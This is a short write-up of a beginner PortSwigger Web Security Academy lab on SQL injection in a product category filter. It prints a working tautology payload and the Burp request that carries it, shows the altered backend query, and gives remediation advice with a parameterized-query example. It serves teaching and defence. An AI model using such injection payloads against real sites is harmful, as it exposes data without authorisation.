# Lab 01 — SQL Injection Vulnerability in WHERE Clause

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Apprentice  
**Vulnerability Class:** SQL Injection  
**Date Solved:** May 2026  
**Author:** XypherSec  

---

## Objective

Exploit a SQL injection vulnerability in the product category 
filter to display all products, including unreleased ones.

---

## Reconnaissance

Navigating to the shop and selecting a category (Accessories) 
produced the following URL:
/filter?category=Accessories

The `category` parameter was passed directly into a backend 
SQL query with no sanitization — a classic injection point.

---

## Exploitation

**Payload used:**
Accessories'+OR+1=1--

**Request (via Burp Suite Repeater):**
GET /filter?category=Accessories'+OR+1=1-- HTTP/2
Host:0a12003003e387f180a4175200d00050 .web-security-academy.net

**Backend query before injection:**
```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

**Backend query after injection:**
```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

`OR 1=1` evaluates to true for every row, returning all 
products. `--` comments out the remaining query logic 
including the `released = 1` filter.

**Result:** All products including hidden/unreleased items 
were returned. Lab solved.

---

## Remediation

- Use **parameterized queries** (prepared statements) instead 
  of string concatenation
- Apply **input validation** and whitelist acceptable category values
- Implement a **WAF** as an additional layer of defense

**Secure code example (Python):**
```python
cursor.execute(
    "SELECT * FROM products WHERE category = ? AND released = 1",
    (category,)
)
```

---

## References

- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
